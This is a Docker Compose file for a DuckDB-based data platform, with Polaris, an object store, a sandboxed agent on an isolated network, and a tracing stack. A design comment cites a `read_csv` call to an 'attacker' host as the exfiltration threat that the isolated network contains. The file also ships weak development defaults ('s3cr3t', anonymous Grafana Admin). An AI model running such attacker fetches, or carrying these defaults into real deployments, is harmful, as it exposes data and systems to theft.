services:
  postgres:
    image: postgres:18.6-alpine
    restart: unless-stopped
    environment:
      POSTGRES_DB: duckhaven
      POSTGRES_USER: duckhaven
      # Internal-only password (Postgres publishes no port). Shared with the
      # polaris and api services via compose interpolation so they all agree;
      # override in .env for a non-default deployment.
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-duckhaven}
    volumes:
      # Postgres 18's official image moved to a version-specific data
      # subdirectory under a single /var/lib/postgresql mount (unlike 16's
      # /var/lib/postgresql/data), to support `pg_upgrade --link`.
      - postgres_data:/var/lib/postgresql
      # Creates the dedicated `polaris` database on first init.
      - ./postgres-init:/docker-entrypoint-initdb.d:ro
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U duckhaven"]
      interval: 5s
      timeout: 5s
      retries: 5

  # Bundled S3-compatible object store (RustFS). Backs the object_store catalogs
  # (and is the storage Polaris vends credentials for). Its :9000 endpoint must
  # be reachable by remote agents — that is the URL Polaris vends to DuckDB, set
  # via S3_ENDPOINT (defaults to the in-network objectstore:9000; set to the
  # host's address when running agents on other hosts). The warehouse bucket is
  # created by the objectstore-bootstrap one-shot below.
  objectstore:
    image: ${OBJECT_STORE_IMAGE:-rustfs/rustfs}:${OBJECT_STORE_IMAGE_TAG:-1.0.0-rc.6}
    restart: unless-stopped
    # Joins the agent's isolated network in addition to `default`, so the
    # agent can reach it while this service keeps its own outbound access.
    networks:
      - default
      - duckhaven_internal
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      RUSTFS_ACCESS_KEY: ${OBJECT_STORE_ACCESS_KEY:-duckhaven}
      RUSTFS_SECRET_KEY: ${OBJECT_STORE_SECRET_KEY:-duckhaven}
      RUSTFS_VOLUMES: /data
      RUSTFS_ADDRESS: ":9000"
      RUSTFS_CONSOLE_ENABLE: "true"
      RUSTFS_CONSOLE_ADDRESS: ":9001"
      RUSTFS_REGION: ${S3_REGION:-us-east-1}
      # RustFS defaults NEWLY created buckets to `relaxed`, which skips the
      # xl.meta and inline-object fsyncs. A bundled store is force-stopped
      # constantly (compose down, Ctrl-C, OOM kill), so hold it at `strict`:
      # every acknowledged write is on disk before the 200.
      RUSTFS_NEW_BUCKET_DURABILITY_MODE: strict
    volumes:
      - objectstore_data:/data
    healthcheck:
      # /health/ready reports storage + IAM + lock quorum. The S3 data plane
      # answers 503 until all three are up, so gating the dependants on this
      # removes the startup race the old (healthcheck-free) service had.
      test: ["CMD", "curl", "-fsS", "http://127.0.0.1:9000/health/ready"]
      interval: 5s
      timeout: 5s
      retries: 20
      start_period: 15s

  # One-shot: create the warehouse bucket. The store writes through an erasure
  # backend (xl.meta), so a top-level directory is not a bucket — the bucket has
  # to be created over the S3 API. RustFS has no env for this (rustfs#2179 was
  # closed as out of scope); their own `rc` CLI is the documented answer.
  # Idempotent: `rc ls` succeeds only when the bucket already exists, so
  # re-running `up`/`start` is a no-op.
  objectstore-bootstrap:
    image: rustfs/rc:${OBJECT_STORE_CLI_IMAGE_TAG:-v0.1.35}
    depends_on:
      objectstore:
        condition: service_healthy
    environment:
      S3_BUCKET: ${S3_BUCKET:-warehouse}
      OBJECT_STORE_ACCESS_KEY: ${OBJECT_STORE_ACCESS_KEY:-duckhaven}
      OBJECT_STORE_SECRET_KEY: ${OBJECT_STORE_SECRET_KEY:-duckhaven}
    entrypoint: ["/bin/sh", "-c"]
    command:
      - >-
        rc alias set dh http://objectstore:9000
        "$$OBJECT_STORE_ACCESS_KEY" "$$OBJECT_STORE_SECRET_KEY" &&
        { rc ls "dh/$$S3_BUCKET" >/dev/null 2>&1 || rc mb "dh/$$S3_BUCKET"; }
    restart: "no"

  # One-shot: create Polaris's relational-jdbc schema + root principal in the
  # dedicated `polaris` database. Idempotent: the wrapper treats the admin
  # tool's "realm already exists" exit (3) as success, so re-running `up`/`start`
  # is a no-op rather than blocking the dependent services. Stays a separate
  # service because the admin tool ships as its own image (the polaris server
  # image does not include it).
  polaris-bootstrap:
    image: apache/polaris-admin-tool:${POLARIS_IMAGE_TAG:-1.7.0}
    depends_on:
      postgres:
        condition: service_healthy
    environment:
      POLARIS_PERSISTENCE_TYPE: relational-jdbc
      POLARIS_PERSISTENCE_RELATIONAL_JDBC_DATABASE_TYPE: postgresql
      QUARKUS_DATASOURCE_JDBC_URL: jdbc:postgresql://postgres:5432/polaris
      QUARKUS_DATASOURCE_USERNAME: duckhaven
      QUARKUS_DATASOURCE_PASSWORD: ${POSTGRES_PASSWORD:-duckhaven}
    volumes:
      - ./polaris-bootstrap.sh:/polaris-bootstrap.sh:ro
    entrypoint: ["/bin/sh", "/polaris-bootstrap.sh"]
    command:
      - java
      - -jar
      - /deployments/polaris-admin-tool.jar
      - bootstrap
      - --realm=${POLARIS_REALM:-POLARIS}
      - --credential=${POLARIS_REALM:-POLARIS},${POLARIS_CLIENT_ID:-root},${POLARIS_CLIENT_SECRET:-s3cr3t}
    restart: "no"

  polaris:
    image: apache/polaris:${POLARIS_IMAGE_TAG:-1.7.0}
    restart: unless-stopped
    # Joins the agent's isolated network in addition to `default`, so the
    # agent can reach it while this service keeps its own outbound access.
    networks:
      - default
      - duckhaven_internal
    depends_on:
      polaris-bootstrap:
        condition: service_completed_successfully
      postgres:
        condition: service_healthy
      objectstore-bootstrap:
        condition: service_completed_successfully
      otel-collector:
        condition: service_started
    environment:
      POLARIS_PERSISTENCE_TYPE: relational-jdbc
      POLARIS_PERSISTENCE_RELATIONAL_JDBC_DATABASE_TYPE: postgresql
      QUARKUS_DATASOURCE_JDBC_URL: jdbc:postgresql://postgres:5432/polaris
      QUARKUS_DATASOURCE_USERNAME: duckhaven
      QUARKUS_DATASOURCE_PASSWORD: ${POSTGRES_PASSWORD:-duckhaven}
      POLARIS_REALM_CONTEXT_REALMS: ${POLARIS_REALM:-POLARIS}
      # Joins the same trace as the api/agent (see docs/operations/tracing.md);
      # Quarkus's default OTLP protocol is grpc, matching the collector's 4317.
      QUARKUS_OTEL_SDK_DISABLED: "false"
      QUARKUS_OTEL_EXPORTER_OTLP_ENDPOINT: http://otel-collector:4317
      QUARKUS_OTEL_RESOURCE_ATTRIBUTES: service.name=polaris
      # Polaris signs/vends S3 credentials using these to reach the bundled
      # object store. ALLOW_INSECURE_STORAGE_TYPES is needed for a custom http
      # endpoint.
      AWS_ACCESS_KEY_ID: ${OBJECT_STORE_ACCESS_KEY:-duckhaven}
      AWS_SECRET_ACCESS_KEY: ${OBJECT_STORE_SECRET_KEY:-duckhaven}
      AWS_REGION: ${S3_REGION:-us-east-1}
      polaris.features."ALLOW_INSECURE_STORAGE_TYPES": "true"
      # S3 backs the bundled object store and external AWS S3; AZURE enables
      # external ADLS Gen2 backends. The credentials above only reach the
      # bundled store; external backends vend their own short-lived creds via
      # assume-role / managed-identity configured on the storage backend.
      polaris.features."SUPPORTED_CATALOG_STORAGE_TYPES": "[\"S3\",\"AZURE\"]"
      # Service principal Polaris uses to mint ADLS Gen2 SAS tokens for any
      # adls_gen2 backend. The per-backend config only carries the tenant id;
      # these instance-level creds (Azure DefaultAzureCredential chain) are what
      # actually let Polaris consent and vend a scoped SAS. Leave all empty to
      # keep ADLS vending disabled (the bundled S3 store still works).
      AZURE_TENANT_ID: ${AZURE_TENANT_ID:-}
      AZURE_CLIENT_ID: ${AZURE_CLIENT_ID:-}
      AZURE_CLIENT_SECRET: ${AZURE_CLIENT_SECRET:-}
      # Optional STS endpoint override for external S3 roles (e.g. LocalStack,
      # GovCloud, a VPC STS endpoint). Intentionally NOT given an empty default:
      # an empty AWS_ENDPOINT_URL_STS makes the AWS SDK build an STS client with
      # no protocol ("protocol must not be null"), which breaks credential
      # vending for the bundled catalog (role-less S3, no STS). Leaving it
      # unset lets Polaris vend static creds directly. To use a custom STS
      # endpoint, add `AWS_ENDPOINT_URL_STS: <url>` here.
      polaris.readiness.ignore-severe-issues: "true"
    healthcheck:
      test: ["CMD", "curl", "--fail", "http://localhost:8182/q/health"]
      interval: 5s
      timeout: 5s
      retries: 20
      start_period: 15s

  api:
    image: ghcr.io/tamasmrtn/duckhaven-api:${DUCKHAVEN_IMAGE_TAG:-latest}
    restart: unless-stopped
    # Joins the agent's isolated network in addition to `default`, so the
    # agent can reach it while this service keeps its own outbound access.
    networks:
      - default
      - duckhaven_internal
    ports:
      - "8000:8000"
    depends_on:
      postgres:
        condition: service_healthy
      polaris:
        condition: service_healthy
    environment:
      # Captured to the secrets dir (inside api_data) on first boot by the
      # entrypoint and reused thereafter; the postgres password is shared with
      # the postgres/polaris services via compose interpolation.
      SECRET_KEY: ${SECRET_KEY:-}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-duckhaven}
      POLARIS_BASE_URL: http://polaris:8181
      POLARIS_REALM: ${POLARIS_REALM:-POLARIS}
      POLARIS_CLIENT_ID: ${POLARIS_CLIENT_ID:-root}
      POLARIS_CLIENT_SECRET: ${POLARIS_CLIENT_SECRET:-s3cr3t}
      # Bundled object store backing object_store catalogs. S3_ENDPOINT is
      # vended to agents; it defaults to the in-network objectstore:9000 so the
      # bundled agent works out of the box. Set it to a host-reachable address
      # when running agents on other hosts. S3_ENDPOINT_INTERNAL is what Polaris
      # uses inside the compose network.
      S3_ENDPOINT: ${S3_ENDPOINT:-http://objectstore:9000}
      S3_ENDPOINT_INTERNAL: ${S3_ENDPOINT_INTERNAL:-http://objectstore:9000}
      # Client-facing endpoint for SQL-session staging uploads. The agent reads
      # staged files at the in-network S3_ENDPOINT (objectstore:9000); a dlt
      # client on the host uploads via this one. Set it to the box's reachable
      # address when running dlt from another host.
      S3_ENDPOINT_PUBLIC: ${S3_ENDPOINT_PUBLIC:-http://localhost:9000}
      S3_REGION: ${S3_REGION:-us-east-1}
      S3_BUCKET: ${S3_BUCKET:-warehouse}
      # Bundled-store credentials the API uses to presign SQL-session staging
      # URLs for the object_store backend (external s3 backends assume a role).
      S3_ACCESS_KEY: ${OBJECT_STORE_ACCESS_KEY:-duckhaven}
      S3_SECRET_KEY: ${OBJECT_STORE_SECRET_KEY:-duckhaven}
      # AAD identity for user-delegation SAS on external adls_gen2 staging (same
      # instance creds Polaris uses; leave empty to keep ADLS staging disabled).
      AZURE_TENANT_ID: ${AZURE_TENANT_ID:-}
      AZURE_CLIENT_ID: ${AZURE_CLIENT_ID:-}
      AZURE_CLIENT_SECRET: ${AZURE_CLIENT_SECRET:-}
      # Single-use token the API seeds on startup so the bundled agent can
      # auto-register without an operator minting one in the admin UI (folds in
      # the former agent-bootstrap one-shot; idempotent re-seed on restart).
      AGENT_BOOTSTRAP_TOKEN: ${AGENT_BOOTSTRAP_TOKEN:-dh_boot_localdev_seed}
      # Plain-HTTP deployment by default; the browser drops Secure cookies over
      # HTTP, which would break login. Set true only behind a TLS terminator.
      COOKIE_SECURE: ${COOKIE_SECURE:-false}
      # AI data assistant (optional). Off by default. To enable, configure a model
      # and set ASSISTANT_ENABLED=true; the "assistant" service account is created
      # on startup. It starts with no access at all, so add it to the workspaces it
      # should serve — until then the assistant panel says it cannot be used there.
      # ASSISTANT_API_KEY is a secret (rotate it); a self-hosted OpenAI-compatible
      # endpoint via ASSISTANT_OPENAI_BASE_URL can run keyless. See
      # docs/reference/configuration.md#ai-assistant.
      ASSISTANT_ENABLED: ${ASSISTANT_ENABLED:-false}
      ASSISTANT_MODEL: ${ASSISTANT_MODEL:-anthropic:claude-sonnet-5}
      ASSISTANT_OPENAI_BASE_URL: ${ASSISTANT_OPENAI_BASE_URL:-}
      ASSISTANT_API_KEY: ${ASSISTANT_API_KEY:-}
      # MCP server at /mcp, so an external AI agent (Claude Code, Claude Desktop,
      # Cursor) can browse metadata and run governed SQL as the holder of a
      # DuckHaven access token. On by default — it needs no configuration and can
      # reach nothing that token could not already reach through /api. Writes are
      # off separately: there is no way to ask a human to approve one over MCP.
      # See docs/concepts/mcp-server.md.
      MCP_ENABLED: ${MCP_ENABLED:-true}
      MCP_ALLOW_WRITES: ${MCP_ALLOW_WRITES:-false}
      MCP_QUERY_TIMEOUT_S: ${MCP_QUERY_TIMEOUT_S:-120.0}
      MCP_RESULT_ROW_CAP: ${MCP_RESULT_ROW_CAP:-100}
      MCP_RESULT_BYTE_CAP: ${MCP_RESULT_BYTE_CAP:-32768}
      # SQL sessions (the dbt/dlt session layer, and what the SQL connector
      # talks to). OFF by default, matching the API's own default: the session
      # surface carries a relaxed statement policy, so an operator enables it
      # only once the hardened agent is deployed (sandbox-before-relaxed-policy).
      # Without this the session endpoints 404 with "SQL sessions are not
      # enabled", which is the only symptom a client sees.
      SQL_SESSIONS_ENABLED: ${SQL_SESSIONS_ENABLED:-false}
      SQL_SESSION_IDLE_TIMEOUT_S: ${SQL_SESSION_IDLE_TIMEOUT_S:-900}
      SQL_SESSION_MAX_LIFETIME_S: ${SQL_SESSION_MAX_LIFETIME_S:-14400}
      # OIDC / SSO (optional). Empty by default -> SSO off, local login only.
      # OIDC_PROVIDERS is a JSON list of providers (one button each); see
      # docs/guides/connect-idp.md. The OIDC_* fields below are a single-provider
      # shorthand used only when OIDC_PROVIDERS is empty. For Entra, scopes must
      # not include "groups" (not a valid Entra scope).
      OIDC_PROVIDERS: ${OIDC_PROVIDERS:-}
      OIDC_ENABLED: ${OIDC_ENABLED:-false}
      OIDC_LABEL: ${OIDC_LABEL:-SSO}
      OIDC_SERVER_METADATA_URL: ${OIDC_SERVER_METADATA_URL:-}
      OIDC_CLIENT_ID: ${OIDC_CLIENT_ID:-}
      OIDC_CLIENT_SECRET: ${OIDC_CLIENT_SECRET:-}
      OIDC_SCOPES: ${OIDC_SCOPES:-openid email profile}
      OIDC_GROUPS_CLAIM: ${OIDC_GROUPS_CLAIM:-groups}
      OIDC_GROUP_ROLE_MAP: ${OIDC_GROUP_ROLE_MAP:-}
      OIDC_REDIRECT_BASE_URL: ${OIDC_REDIRECT_BASE_URL:-}
      # OpenTelemetry tracing. Points at the bundled collector by default; set
      # empty to disable tracing entirely.
      OTEL_EXPORTER_OTLP_ENDPOINT: ${OTEL_EXPORTER_OTLP_ENDPOINT:-http://otel-collector:4318}
    volumes:
      # secret_key + setup_token live under this mount (/var/duckhaven/secrets
      # and /var/duckhaven), generated by the entrypoint on first boot.
      - api_data:/var/duckhaven
    healthcheck:
      # Use python stdlib so the image stays curl-free.
      test:
        - CMD
        - python
        - -c
        - "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://localhost:8000/api/healthz', timeout=2).status==200 else 1)"
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s

  # Bundled DuckHaven compute agent. Dials the API control plane over WebSocket,
  # exchanges the seeded bootstrap token for a session credential, advertises its
  # DuckDB capabilities, and executes dispatched queries. The result server binds
  # 0.0.0.0 (Bearer-gated) so the API can fetch result Parquet across the network.
  # The API seeds the bootstrap token during its own startup, so a healthy api is
  # sufficient — no separate bootstrap service to wait on.
  agent:
    image: ghcr.io/tamasmrtn/duckhaven-agent:${DUCKHAVEN_IMAGE_TAG:-latest}
    restart: unless-stopped
    # Memory cap so the cgroup-aware detection has a concrete memory.max to read
    # end to end. Remove or raise via AGENT_MEM_LIMIT= for an unconstrained agent
    # that advertises full host RAM.
    mem_limit: ${AGENT_MEM_LIMIT:-4g}
    # Sandbox hardening. Because the API statement policy (not a hard SQL
    # allowlist) now governs which statements reach DuckDB, the agent must be
    # contained at the OS layer: a read-only root filesystem means any local
    # write outside the results volume fails at the kernel, dropped Linux
    # capabilities + no-new-privileges shrink the blast radius, and a pids cap
    # bounds fork bombs. The agent runs non-root already (see agent/Dockerfile).
    # DuckDB's extensions are baked into the image (read-only-safe: INSTALL is a
    # no-op when present) and it writes temp/spill + result Parquet only under the
    # writable results volume + /tmp tmpfs.
    read_only: true
    tmpfs:
      - /tmp
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    pids_limit: 512
    # Egress restriction: the agent is on the isolated network ONLY, so it can
    # reach api/polaris/objectstore/otel-collector and nothing else. See the
    # networks block at the bottom of this file.
    networks:
      - duckhaven_internal
    depends_on:
      api:
        condition: service_healthy
    environment:
      CONTROL_PLANE_URL: ws://api:8000/agents/connect
      BOOTSTRAP_TOKEN: ${AGENT_BOOTSTRAP_TOKEN:-dh_boot_localdev_seed}
      AGENT_NAME: TestAgent-1
      POLARIS_BASE_URL: http://polaris:8181
      POLARIS_CLIENT_ID: ${POLARIS_CLIENT_ID:-root}
      POLARIS_CLIENT_SECRET: ${POLARIS_CLIENT_SECRET:-s3cr3t}
      # The control plane reaches the result server across the compose network,
      # so bind all interfaces rather than loopback.
      RESULTS_HTTP_HOST: 0.0.0.0
      # DuckDB filesystem sandbox. Off by default because the agent reads
      # presigned staging URLs over http(s) — disabling HTTPFileSystem breaks
      # SQL-session staging. (It does NOT break the bundled Polaris/store: the
      # iceberg REST client and S3FileSystem are independent of it.) Set to
      # "HTTPFileSystem" on a deployment that does not use staging.
      SANDBOX_DISABLED_FILESYSTEMS: ${SANDBOX_DISABLED_FILESYSTEMS:-}
      # Lock DuckDB's configuration once the agent has set the connection up, so
      # a session statement cannot re-widen its own sandbox with SET. On by
      # default; set false only to diagnose a suspected interaction.
      SANDBOX_LOCK_CONFIGURATION: ${SANDBOX_LOCK_CONFIGURATION:-true}
      # OpenTelemetry tracing (empty = disabled), same collector as the api.
      OTEL_EXPORTER_OTLP_ENDPOINT: ${OTEL_EXPORTER_OTLP_ENDPOINT:-http://otel-collector:4318}
    volumes:
      - agent_results:/var/duckhaven-agent/results
    healthcheck:
      # Result server up = agent process alive. Stdlib so the image stays curl-free.
      test:
        - CMD
        - python
        - -c
        - "import socket,sys; s=socket.create_connection(('127.0.0.1',8001),2); s.close()"
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 20s

  # Trace storage. Single instance, local-disk blocks, 72h retention
  # (deploy/tempo/tempo.yaml). Queried via the bundled Grafana below.
  #
  # Pinned (unlike the other bundled images): Tempo 3.0 replaced the
  # monolithic `compactor` config block deploy/tempo/tempo.yaml uses with a
  # disaggregated backend-scheduler/backend-worker split, so riding `:latest`
  # crash-loops the container the moment it moves past 2.x. Override
  # TEMPO_IMAGE_TAG once tempo.yaml is migrated to the 3.x schema.
  tempo:
    image: grafana/tempo:${TEMPO_IMAGE_TAG:-2.8.2}
    restart: unless-stopped
    command: ["-config.file=/etc/tempo.yaml"]
    volumes:
      - ./tempo/tempo.yaml:/etc/tempo.yaml:ro
      - tempo_data:/var/tempo

  # Receives OTLP traces from the api and agent (http, 4318) and Polaris
  # (grpc, 4317), and forwards them to Tempo.
  otel-collector:
    image: otel/opentelemetry-collector:${OTEL_COLLECTOR_IMAGE_TAG:-0.159.0}
    restart: unless-stopped
    # Joins the agent's isolated network in addition to `default`, so the
    # agent can reach it while this service keeps its own outbound access.
    networks:
      - default
      - duckhaven_internal
    command: ["--config=/etc/otelcol/config.yaml"]
    depends_on:
      tempo:
        condition: service_started
    volumes:
      - ./otel/otel-collector.yaml:/etc/otelcol/config.yaml:ro

  # Dev-only trace viewer with the Tempo datasource pre-provisioned (anonymous
  # admin — do not expose beyond localhost). The HA compose file deliberately
  # ships no Grafana; point your own at http://tempo:3200.
  grafana:
    image: grafana/grafana:${GRAFANA_IMAGE_TAG:-13.2.0}
    restart: unless-stopped
    ports:
      - "3000:3000"
    environment:
      GF_AUTH_ANONYMOUS_ENABLED: "true"
      GF_AUTH_ANONYMOUS_ORG_ROLE: Admin
    volumes:
      - ./grafana/provisioning/datasources:/etc/grafana/provisioning/datasources:ro

volumes:
  postgres_data:
  api_data:
  objectstore_data:
  agent_results:
  tempo_data:

# Agent egress restriction. `duckhaven_internal` is an isolated bridge with no
# route off the host and no external DNS, so a container attached ONLY to it
# cannot reach the internet — verified: in-network service calls succeed while
# an external address returns "Network is unreachable".
#
# This is the control that contains `read_csv('http://attacker/…')` from a
# session statement. The API statement policy rejects such a statement first;
# this is the second layer the design called for, enforced by the kernel rather
# than by a parser. The agent is the only service placed on this network alone;
# api/polaris/objectstore/otel-collector join it *in addition to* `default`, so they
# keep the outbound access they legitimately need (OIDC, external object stores,
# image-side calls) and stay reachable from the agent.
#
# Cost: an agent whose catalogs use EXTERNAL storage (s3 / adls_gen2), or that
# must reach an off-host Polaris, needs real internet — those deployments opt out
# with deploy/docker-compose.egress-opt-out.yml. See docs/concepts/sql-sessions.md.
networks:
  default:
  duckhaven_internal:
    internal: true
